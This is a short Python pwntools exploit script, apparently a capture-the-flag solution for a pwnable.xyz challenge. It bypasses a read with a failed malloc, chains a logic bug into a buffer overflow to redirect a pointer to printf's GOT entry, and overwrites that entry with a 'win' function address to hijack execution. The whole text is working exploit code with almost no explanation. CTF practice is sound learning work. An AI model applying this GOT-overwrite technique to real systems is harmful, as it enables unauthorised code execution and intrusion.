from pwn import *

###Util
def handle_fill(idx1,idx2):
    r.sendlineafter('> ','3')
    r.sendlineafter('> ',str(idx1))
    r.sendlineafter('> ',str(idx2))

def save(data,first=False):
    r.sendlineafter('> ','5')
    if first is True:
        r.sendafter('Size: ',str(0xffffffffffffffff).encode().ljust(0x1f,b'\x00'))
    r.send(data)

###Addr
printf_got = 0x610b28
win = 0x4008e8

###Exploit
r = remote('svc.pwnable.xyz',30036)
###Strange logic, bypass read to NULL with failed malloc
save('M30W',first=True)

###Logic bug again, continuously concat payload to bof and hijack buf ptr
handle_fill(3,0)
handle_fill(4,0)
handle_fill(4,0)
handle_fill(4,0)
handle_fill(4,0)
handle_fill(4,0)

save(b'\x00'*0xa0+p64(printf_got))
save(p64(win))
r.interactive()
